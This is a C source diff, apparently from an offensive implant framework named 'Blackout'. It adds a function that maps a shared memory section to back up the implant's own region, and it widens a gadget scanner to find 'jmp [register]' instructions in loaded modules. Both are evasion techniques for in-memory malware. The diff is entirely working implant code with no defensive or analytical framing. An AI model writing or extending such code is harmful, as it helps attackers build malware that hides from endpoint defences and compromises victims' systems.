@@ -3,8 +3,36 @@
 
 typedef HMODULE (*fnLoadLibraryA)( LPCSTR );
 
-FUNC PVOID FindGadget( 
-    PVOID ModuleBase
+FUNC BOOL CreateImplantBackup(
+    VOID
+) {
+    BLACKOUT_INSTANCE
+
+    LARGE_INTEGER MaximumSize = { 0 };
+    HANDLE        hSection    = NULL;
+    ULONG         Status      = STATUS_SUCCESS;
+
+    MaximumSize.HighPart = 0;
+    MaximumSize.LowPart  = Instance()->Blackout.Region.Length;
+
+    Status = Instance()->Win32.NtCreateSection( 
+        &hSection, SECTION_ALL_ACCESS, NULL, 
+        &MaximumSize, PAGE_READWRITE, SEC_COMMIT, NULL 
+    ); 
+    if ( Status != 0 ) return FALSE;
+
+    Status = Instance()->Win32.NtMapViewOfSection( 
+        hSection, NtCurrentProcess(), &Instance()->Blackout.Backup, 
+        0, 0, 0, &Instance()->Blackout.Region.Length, ViewShare, 0, PAGE_READWRITE 
+    );
+    if ( Status != 0 ) return FALSE;
+
+    return TRUE;
+}
+
+FUNC PVOID FindJmpGadget( 
+    PVOID ModuleBase,
+    BYTE  Register
 ) {
     UINT64 Gadget      = 0;
     PBYTE  SearchBase  = NULL;
@@ -14,7 +42,7 @@ FUNC PVOID FindGadget(
     SearchSize = 0x1000 * 0x1000;    
 
     for ( INT i = 0; i < SearchSize - 1; i++ ) {
-        if ( SearchBase[i] == 0xff && SearchBase[i+1] == 0x23 ) {
+        if ( SearchBase[i] == 0xff && SearchBase[i+1] == Register ) {
             Gadget = SearchBase + i;
             break;
         }
